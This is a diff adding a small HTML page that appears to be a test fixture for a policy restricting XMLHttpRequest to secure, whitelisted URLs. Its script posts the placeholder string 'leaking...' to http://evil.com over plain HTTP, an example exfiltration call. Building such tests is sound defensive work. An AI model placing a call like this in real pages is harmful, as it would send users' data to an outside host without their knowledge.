@@ -1,0 +1,16 @@
+<html lang="en">
+
+<head>
+    <title>Restrict XMLHttpRequest to secure connections and whitelist URLs</title>
+</head>
+
+<body>
+
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open("post","http://evil.com");
+  xhr.send("leaking...")
+</script>
+</body>
+
+</html>
